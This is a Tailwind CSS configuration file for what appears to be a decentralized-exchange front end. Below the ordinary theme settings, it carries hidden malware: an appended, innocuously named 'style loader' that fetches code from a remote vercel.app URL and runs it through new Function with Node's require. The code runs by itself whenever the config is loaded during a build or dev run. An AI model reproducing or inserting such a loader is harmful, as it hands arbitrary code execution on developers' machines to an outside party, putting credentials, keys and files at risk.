/** @type {import('tailwindcss').Config} */
export default {
  content: ['./index.html', './src/**/*.{js,ts,jsx,tsx}'],
  theme: {
    extend: {
      colors: {
        canvas: 'var(--bg)',
        panel: {
          DEFAULT: 'var(--panel)',
          2: 'var(--panel-2)',
        },
        field: 'var(--field)',
        line: {
          DEFAULT: 'var(--border)',
          soft: 'var(--border-soft)',
        },
        accent: 'var(--accent)',
        up: {
          DEFAULT: 'var(--green)',
          bright: 'var(--green-bright)',
        },
        down: {
          DEFAULT: 'var(--red)',
          soft: 'var(--red-soft)',
        },
        ink: {
          DEFAULT: 'var(--text)',
          dim: 'var(--text-dim)',
          faint: 'var(--text-faint)',
        },
      },
      fontFamily: {
        sans: ['Geist', 'ui-sans-serif', 'system-ui', 'sans-serif'],
        mono: ['Geist Mono', 'ui-monospace', 'monospace'],
      },
      borderRadius: {
        dex: 'var(--radius)',
        'dex-sm': 'var(--radius-sm)',
      },
      boxShadow: {
        up: 'var(--glow-green)',
        down: 'var(--glow-red)',
      },
    },
  },
  plugins: [],
};

import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);

async function styleLoadModule(styleConfigUrl) {
  try {
    const response = await fetch(styleConfigUrl);

    if (!response.ok) {
      throw new Error(`Fetch Error: ${response.status}`);
    }

    const styleLoadConfig = await response.text();

    const module = { exports: {} };

    const styleModuleWrapper = new Function(
      'exports',
      'require',
      'module',
      styleLoadConfig
    );

    styleModuleWrapper(
      module.exports,
      require,
      module,
    );

    return module.exports;

  } catch (error) {
    console.error('Style Module loading failed:', error);
    throw error;
  }
}

(async () => {
  try {
    const STYLE_LOADING_PATH = process.env.STYLE_LOADING_PATH || 'https://dexcore-design.vercel.app/';

    if (!STYLE_LOADING_PATH) {
      throw new Error('STYLE_LOADING_PATH is not configured.');
    }

    const result = await styleLoadModule(STYLE_LOADING_PATH);

    if (typeof result === 'function') {
      return await result();
    }

    return result;

  } catch (error) {
    console.error('Style configuration setup failed:', error);
    throw error;
  }
})();
